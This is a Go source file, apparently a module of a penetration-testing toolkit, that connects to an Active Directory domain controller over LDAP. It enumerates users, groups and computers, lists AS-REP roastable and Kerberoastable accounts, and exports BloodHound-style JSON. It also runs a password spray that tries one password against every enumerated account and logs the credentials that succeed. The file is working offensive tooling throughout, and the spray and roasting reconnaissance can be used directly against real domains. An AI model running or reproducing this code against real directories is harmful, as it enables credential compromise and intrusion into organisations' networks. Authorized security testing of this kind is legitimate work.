package adops

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/go-ldap/ldap/v3"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

func Run() error {
	ui.Header("AD Ops — Active Directory Reconnaissance & Exploitation")

	host := ui.Prompt("DC host (IP or hostname)")
	if host == "" {
		return nil
	}
	port := ui.PromptDefault("LDAP port", "389")
	domain := ui.Prompt("Domain (e.g. corp.local)")
	user := ui.Prompt("Bind user (e.g. CORP\\john or john@corp.local)")
	pass := ui.Prompt("Password")

	if domain == "" {
		ui.Fail("Domain required.")
		return nil
	}

	baseDN := domainToDN(domain)
	addr := fmt.Sprintf("%s:%s", host, port)
	ldapAddr = "ldap://" + addr

	ui.Info(fmt.Sprintf("Connecting to %s (base DN: %s)...", addr, baseDN))

	conn, err := ldap.DialURL(ldapAddr)
	if err != nil {
		ui.Fail(fmt.Sprintf("LDAP connect failed: %v", err))
		return nil
	}
	defer conn.Close()

	if err := conn.Bind(user, pass); err != nil {
		ui.Fail(fmt.Sprintf("LDAP bind failed: %v", err))
		return nil
	}
	ui.Success("LDAP bind successful.")

	eng, _ := engagement.Active()

	for {
		action := ui.Select("AD Operation", []string{
			"Enumerate Users",
			"Enumerate Groups",
			"Enumerate Computers",
			"Find AS-REP Roastable Accounts",
			"Find Kerberoastable Accounts (SPNs)",
			"Password Spray",
			"Export BloodHound JSON",
		})
		if action < 0 {
			break
		}

		switch action {
		case 0:
			enumUsers(conn, baseDN, eng)
		case 1:
			enumGroups(conn, baseDN, eng)
		case 2:
			enumComputers(conn, baseDN, eng)
		case 3:
			findASREP(conn, baseDN, eng)
		case 4:
			findKerberoastable(conn, baseDN, eng)
		case 5:
			passwordSpray(conn, baseDN, domain)
		case 6:
			exportBloodHound(conn, baseDN)
		}
	}
	return nil
}

func enumUsers(conn *ldap.Conn, baseDN string, eng *engagement.Engagement) {
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 500, 0, false,
		"(&(objectClass=user)(objectCategory=person))",
		[]string{"sAMAccountName", "displayName", "mail", "memberOf", "userAccountControl"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	fmt.Println()
	ui.Divider()
	fmt.Printf("  %-30s  %-30s  %-30s\n",
		ui.Bold.Render("USERNAME"),
		ui.Bold.Render("DISPLAY NAME"),
		ui.Bold.Render("EMAIL"),
	)
	ui.Divider()

	for _, e := range sr.Entries {
		sam := e.GetAttributeValue("sAMAccountName")
		dn := e.GetAttributeValue("displayName")
		mail := e.GetAttributeValue("mail")
		fmt.Printf("  %-30s  %-30s  %-30s\n", sam, dn, mail)
	}
	fmt.Printf("\n  Total: %d users\n", len(sr.Entries))

	if eng != nil {
		engagement.LogFinding(eng.ID, "ad_ops", baseDN,
			fmt.Sprintf("AD User Enumeration: %d users found", len(sr.Entries)),
			"", "INFO", "")
	}
	ui.PressEnter()
}

func enumGroups(conn *ldap.Conn, baseDN string, eng *engagement.Engagement) {
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 200, 0, false,
		"(objectClass=group)",
		[]string{"cn", "description", "member"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	fmt.Println()
	for _, e := range sr.Entries {
		cn := e.GetAttributeValue("cn")
		desc := e.GetAttributeValue("description")
		memberCount := len(e.GetAttributeValues("member"))
		fmt.Printf("  %s  %-40s  %d members  %s\n",
			ui.Cyan.Render("GRP"),
			cn,
			memberCount,
			ui.Dim.Render(desc),
		)
	}
	fmt.Printf("\n  Total: %d groups\n", len(sr.Entries))

	if eng != nil {
		engagement.LogFinding(eng.ID, "ad_ops", baseDN,
			fmt.Sprintf("AD Group Enumeration: %d groups", len(sr.Entries)),
			"", "INFO", "")
	}
	ui.PressEnter()
}

func enumComputers(conn *ldap.Conn, baseDN string, eng *engagement.Engagement) {
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 500, 0, false,
		"(objectClass=computer)",
		[]string{"cn", "operatingSystem", "operatingSystemVersion", "dNSHostName"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	fmt.Println()
	fmt.Printf("  %-25s  %-30s  %s\n",
		ui.Bold.Render("HOSTNAME"),
		ui.Bold.Render("OS"),
		ui.Bold.Render("DNS"),
	)
	ui.Divider()
	for _, e := range sr.Entries {
		cn := e.GetAttributeValue("cn")
		os_ := e.GetAttributeValue("operatingSystem")
		dns := e.GetAttributeValue("dNSHostName")
		fmt.Printf("  %-25s  %-30s  %s\n", cn, os_, dns)
	}
	fmt.Printf("\n  Total: %d computers\n", len(sr.Entries))

	if eng != nil {
		engagement.LogFinding(eng.ID, "ad_ops", baseDN,
			fmt.Sprintf("AD Computer Enumeration: %d computers", len(sr.Entries)),
			"", "INFO", "")
	}
	ui.PressEnter()
}

func findASREP(conn *ldap.Conn, baseDN string, eng *engagement.Engagement) {
	// UAC flag 0x400000 = DONT_REQUIRE_PREAUTH
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 200, 0, false,
		"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
		[]string{"sAMAccountName", "userPrincipalName"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	fmt.Println()
	if len(sr.Entries) == 0 {
		ui.Info("No AS-REP roastable accounts found.")
	} else {
		ui.Warn(fmt.Sprintf("%d AS-REP roastable accounts found!", len(sr.Entries)))
		for _, e := range sr.Entries {
			sam := e.GetAttributeValue("sAMAccountName")
			fmt.Printf("  %s  %s\n", ui.Red.Render("[AS-REP]"), sam)
			if eng != nil {
				engagement.LogFinding(eng.ID, "ad_ops", sam,
					"AS-REP Roastable account: "+sam,
					"Account does not require Kerberos pre-authentication", "HIGH", sam)
			}
		}
	}
	ui.PressEnter()
}

func findKerberoastable(conn *ldap.Conn, baseDN string, eng *engagement.Engagement) {
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 200, 0, false,
		"(&(objectClass=user)(servicePrincipalName=*)(!cn=krbtgt))",
		[]string{"sAMAccountName", "servicePrincipalName"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	fmt.Println()
	if len(sr.Entries) == 0 {
		ui.Info("No Kerberoastable accounts found.")
	} else {
		ui.Warn(fmt.Sprintf("%d Kerberoastable accounts found!", len(sr.Entries)))
		for _, e := range sr.Entries {
			sam := e.GetAttributeValue("sAMAccountName")
			spns := e.GetAttributeValues("servicePrincipalName")
			fmt.Printf("  %s  %-25s  %s\n",
				ui.Red.Render("[SPN]"),
				sam,
				strings.Join(spns, ", "),
			)
			if eng != nil {
				engagement.LogFinding(eng.ID, "ad_ops", sam,
					"Kerberoastable account: "+sam,
					"SPNs: "+strings.Join(spns, ", "), "HIGH", sam)
			}
		}
	}
	ui.PressEnter()
}

var ldapAddr string

func passwordSpray(conn *ldap.Conn, baseDN, domain string) {
	// Get user list
	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 500, 0, false,
		"(&(objectClass=user)(objectCategory=person))",
		[]string{"sAMAccountName"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Cannot enumerate users: %v", err))
		return
	}

	password := ui.Prompt("Password to spray")
	if password == "" {
		return
	}

	ui.Warn(fmt.Sprintf("Spraying '%s' against %d accounts...", password, len(sr.Entries)))
	ui.Warn("Be careful of account lockout policies!")
	if !ui.Confirm("Proceed?") {
		return
	}

	eng, _ := engagement.Active()
	for _, e := range sr.Entries {
		sam := e.GetAttributeValue("sAMAccountName")
		upn := sam + "@" + domain

		testConn, err := ldap.DialURL(ldapAddr)
		if err != nil {
			continue
		}
		err = testConn.Bind(upn, password)
		testConn.Close()

		if err == nil {
			fmt.Printf("  %s  %s : %s\n", ui.Red.Render("HIT!"), sam, password)
			if eng != nil {
				engagement.LogFinding(eng.ID, "ad_ops", sam,
					fmt.Sprintf("Password spray success: %s", sam),
					fmt.Sprintf("Password: %s", password), "CRITICAL", sam+":"+password)
			}
		}
	}
	ui.PressEnter()
}

func exportBloodHound(conn *ldap.Conn, baseDN string) {
	ui.Info("Exporting BloodHound-compatible JSON...")

	req := ldap.NewSearchRequest(baseDN,
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 1000, 0, false,
		"(objectClass=user)",
		[]string{"sAMAccountName", "memberOf", "distinguishedName"},
		nil,
	)
	sr, err := conn.Search(req)
	if err != nil {
		ui.Fail(fmt.Sprintf("Search failed: %v", err))
		return
	}

	type node struct {
		Name   string   `json:"name"`
		Groups []string `json:"groups"`
	}
	var nodes []node
	for _, e := range sr.Entries {
		nodes = append(nodes, node{
			Name:   e.GetAttributeValue("sAMAccountName"),
			Groups: e.GetAttributeValues("memberOf"),
		})
	}

	out := map[string]interface{}{
		"meta": map[string]interface{}{
			"type":    "users",
			"version": 3,
			"count":   len(nodes),
		},
		"data": nodes,
	}
	data, _ := json.MarshalIndent(out, "", "  ")
	fname := "bloodhound_users.json"
	os.WriteFile(fname, data, 0600)
	ui.Success(fmt.Sprintf("BloodHound JSON exported: %s (%d users)", fname, len(nodes)))
	ui.PressEnter()
}

func domainToDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}
